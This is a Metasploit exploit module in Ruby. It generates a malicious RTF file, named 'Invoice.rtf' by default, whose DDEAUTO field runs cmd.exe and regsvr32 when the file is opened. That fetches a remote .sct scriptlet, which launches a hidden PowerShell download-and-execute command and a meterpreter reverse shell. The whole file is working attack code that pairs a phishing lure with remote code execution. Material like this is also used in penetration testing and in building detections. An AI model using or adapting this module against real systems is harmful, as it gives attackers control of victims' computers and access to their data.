class MetasploitModule < Msf::Exploit::Remote
  Rank = ManualRanking

  include Msf::Exploit::Remote::HttpServer
  include Msf::Exploit::FILEFORMAT
  include Msf::Exploit::Powershell
  include Msf::Exploit::EXE

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Microsoft Office HTA Payload via DDE',
      'Description'    => %q{
        This module generates an RTF document that contains a DDE field which, when opened,
        executes a PowerShell HTA payload via `regsvr32` and `.sct`.
      },
      'Author'         => ['HT'],
      'License'        => MSF_LICENSE,
      'DisclosureDate' => 'Oct 10 2017',
      'References'     => [
        ['URL', 'https://HT.com'],
        ['URL', 'https://HT.com/']
      ],
      'Arch'           => [ARCH_X86, ARCH_X64],
      'Platform'       => 'win',
      'Stance'         => Msf::Exploit::Stance::Aggressive,
      'Targets'        => [['Microsoft Office', {}]],
      'DefaultTarget'  => 0,
      'Payload'        => {
        'DisableNops' => true
      },
      'DefaultOptions' => {
        'DisablePayloadHandler' => false,
        'PAYLOAD'               => 'windows/meterpreter/reverse_tcp',
        'EXITFUNC'              => 'thread'
      }
    ))

    register_options([
      OptString.new("FILENAME", [true, "Filename to save as", "Invoice.rtf"]),
      OptPath.new("INJECT_PATH", [false, "Path to file to inject", nil])
    ])
  end

  def gen_psh(url, *method)
    ssl = datastore['SSL'] || false
    ignore_cert = Rex::Powershell::PshMethods.ignore_ssl_certificate if ssl

    if method.include?('string')
      download_string = datastore['PSH-Proxy'] ? 
        Rex::Powershell::PshMethods.proxy_aware_download_and_exec_string(url) :
        Rex::Powershell::PshMethods.download_and_exec_string(url)
    else
      random = "#{Rex::Text.rand_text_alphanumeric(8)}.exe"
      filename = datastore['BinaryEXE-FILENAME'].to_s.empty? ? random : datastore['BinaryEXE-FILENAME']
      path = datastore['BinaryEXE-PATH'].to_s.empty? ? "$env:temp" : "'#{datastore['BinaryEXE-PATH']}'"
      file = %Q(echo (#{path}+'\\#{filename}'))
      download_string = Rex::Powershell::PshMethods.download_run(url, file)
    end

    download_and_run = "#{ignore_cert}#{download_string}"
    return generate_psh_command_line(noprofile: true, windowstyle: 'hidden', command: download_and_run)
  end

  def on_request_uri(cli, request)
    if request.raw_uri =~ /\.sct$/
      print_status("Handling request for .sct from #{cli.peerhost}")
      payload = gen_psh(get_uri, "string")
      data = gen_sct_file(payload)
      send_response(cli, data, 'Content-Type' => 'text/plain')
    else
      print_status("Delivering payload to #{cli.peerhost}...")
      p = regenerate_payload(cli)
      data = cmd_psh_payload(p.encoded, payload_instance.arch.first,
        remove_comspec: true,
        exec_in_place: true
      )
      send_response(cli, data, 'Content-Type' => 'application/octet-stream')
    end
  end

  def rand_class_id
    "#{Rex::Text.rand_text_hex(8)}-#{Rex::Text.rand_text_hex(4)}-" \
    "#{Rex::Text.rand_text_hex(4)}-#{Rex::Text.rand_text_hex(4)}-" \
    "#{Rex::Text.rand_text_hex(12)}"
  end

  def gen_sct_file(command)
    return %{
<xml version="1.0"?>
<scriptlet>
  <registration
    progid="#{Rex::Text.rand_text_alphanumeric(8)}"
    classid="{#{rand_class_id}}">
  </registration>
  <script>
    <![CDATA[
      var r = new ActiveXObject("WScript.Shell");
      r.Run("#{command}", 0, false);
    ]]>
  </script>
</scriptlet>
    } unless command.to_s.empty?
  end

  def retrieve_header(filename)
    if datastore['INJECT_PATH'] && ::File.file?(datastore['INJECT_PATH'])
      fd = ::File.open(datastore['INJECT_PATH'], 'rb')
      header = fd.read(fd.stat.size).split('{*\datastore}').first.to_s
      print_status("Injecting #{datastore['INJECT_PATH']}...")
      return header
    else
      header = '{\rtf1\ansi\ansicpg1252\deff0\nouicompat\deflang1033' + "\n"
      header << '{\fonttbl{\f0\fnil\fcharset0 Calibri;}}' + "\n"
      header << '{\*\generator Riched20 6.3.9600}\viewkind4\uc1' + "\n"
      header << '\pard\sa200\sl276\slmult1\f0\fs22\lang9 ' + "\n"
      return header
    end
  end

  def create_rtf
    header = retrieve_header(datastore['FILENAME'])
    field_class = '{\field{\*\fldinst {\rtlch\fcs1 \af31507 \ltrch\fcs0 ' + "\n"
    field_class << "DDEAUTO \"C:\\\\Windows\\\\System32\\\\cmd.exe\" \"/c regsvr32 /s /n /u /i:#{get_uri}.sct scrobj.dll\" }}" + "\n"
    field_class << '{\fldrslt }}\sectd \ltrsect\linex0\endnhere\sectlinegrid360\sectdefaultcl\sftnbj ' + "\n"
    field_class << '\par }'
    footer = '}}'
    return header + field_class + footer
  end

  def primer
    file_create(create_rtf)
  end
end
